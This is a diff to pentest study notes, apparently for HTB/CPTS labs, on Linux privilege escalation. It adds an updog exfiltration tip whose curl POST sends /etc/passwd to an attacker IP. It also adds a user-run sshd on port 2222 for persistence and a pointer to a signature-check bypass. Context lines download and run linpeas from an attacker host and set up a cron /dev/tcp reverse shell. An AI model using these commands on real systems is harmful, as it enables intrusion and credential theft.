@@ -37,6 +37,17 @@ curl http://10.10.14.x:8080/linpeas.sh -o /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt
 ```
 
+> [!tip] **Need to pull loot *back* too? Use [[Tools/File Transfer/updog\|updog]] instead of `http.server`.** `python3 -m http.server` is download-only. [[Tools/File Transfer/updog\|updog]] serves *and* receives over one HTTP port, so the same server delivers your tools and catches exfil (hashes, `/etc/shadow`, dumps) with no receiver script.
+> ```bash
+> # Attacker — serve + receive on one port (default 9090)
+> updog -d /tmp/loot -p 8001            # web-server convention: 8001+
+>
+> # Target — download a tool
+> wget http://10.10.14.x:8001/linpeas.sh -O /tmp/linpeas.sh
+> # Target — push loot back (multipart POST, no extra script)
+> curl -X POST http://10.10.14.x:8001/ -F "file=@/etc/passwd"
+> ```
+
 ---
 
 ## Stabilize First — Drop an SSH Key (no password needed)
@@ -68,6 +79,19 @@ chown -R victim:victim /home/victim/.ssh     # ownership must match the user (if
 chmod 600 id_key
 ssh -i id_key victim@<target>
 ```
+
+> [!warning] **Prerequisite: `sshd` must already be listening — key-drop does not start it.** Dropping a key is useless if nothing is on port 22.
+> - **Port 22 missing from your scan ≠ SSH off.** It's very often **bound to `127.0.0.1`** or firewalled from the VPN (the shape of HTB *Era*). Confirm on-box first: `ss -tlnp | grep ':22'` or `ps aux | grep sshd`. If it's localhost-only, drop the key and reach it through a **port-forward / pivot** (`ssh -L`, chisel) or an on-box request — you don't need to "turn SSH on." **Full end-to-end chain (foothold → key → tunnel → shell):** [[Class notes/HTB Academy/CPTS v2 (claude)/Pivoting, Tunneling & Port Forwarding#Scenario — Turn a foothold into a stable SSH shell (localhost-bound sshd)|Pivoting → Stable SSH shell scenario]].
+> - **Starting the real service needs root.** `systemctl start ssh` and binding **port 22** (privileged, <1024) both require root/sudo — an unprivileged user cannot enable the box's system SSH daemon.
+> - **But a non-root user CAN run their *own* `sshd` on a high port** (no sudo), *if the `sshd` binary is present*. It runs as — and only lets in — the invoking user, which is exactly what you want; point every path at somewhere writable:
+>   ```bash
+>   ssh-keygen -t ed25519 -f /tmp/hk -N ''            # a host key you own
+>   /usr/sbin/sshd -p 2222 -h /tmp/hk \
+>     -o "PidFile /tmp/sshd.pid" -o "AuthorizedKeysFile /tmp/ak" -o "UsePAM no"
+>   #  put your PUBLIC key in /tmp/ak, then:  ssh -i id_key -p 2222 victim@<target>
+>   #  (tunnel 2222 out first if the host firewall blocks it)
+>   ```
+>   Doubles as persistence. If `sshd` isn't installed at all, skip this — keep the reverse shell plus another persistence method.
 
 > [!warning] `sshd` **rejects keys if permissions are loose**: `~/.ssh` must be `700`, `authorized_keys` `600`, and both owned by that user. A key that "doesn't work" is almost always a perms/ownership problem (check `/var/log/auth.log`), or `PubkeyAuthentication no` / `AuthorizedKeysFile` overridden in `sshd_config`. Root's key goes in `/root/.ssh/authorized_keys`.
 
@@ -417,6 +441,8 @@ EOF
 > ```
 > The outer dash just execs `bash -c '...'` (a simple command it has no trouble with); the inner bash does the `/dev/tcp` redirection natively. Alternatively put `SHELL=/bin/bash` at the top of the crontab.
 > **When a cron shell "won't fire," sanity-check the boring things:** listener actually running (`nc -lvnp 9002`), your VPN IP still current (`ip a` on `tun0`), and the job's timing/permissions.
+
+> [!tip] **Writable *binary* gated by a "signature check"?** Same primitive, one extra hoop: root runs the binary only if it passes a check. If that check is a **grep/existence test rather than a real crypto verify** (`objcopy…asn1parse…grep` with **no** `openssl *-verify` in the `pspy` trace), you graft the expected blob on and skip the key entirely. Full method + HTB Era worked example: [[Exploits/Signature Verification Bypass|Signature Verification Bypass]].
 
 ### Writable directory in cron PATH
 
@@ -1187,5 +1213,5 @@ KERNEL (last resort — can panic the host)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-20*
+*Updated: 2026-08-21*
 *Model: claude-opus-5*
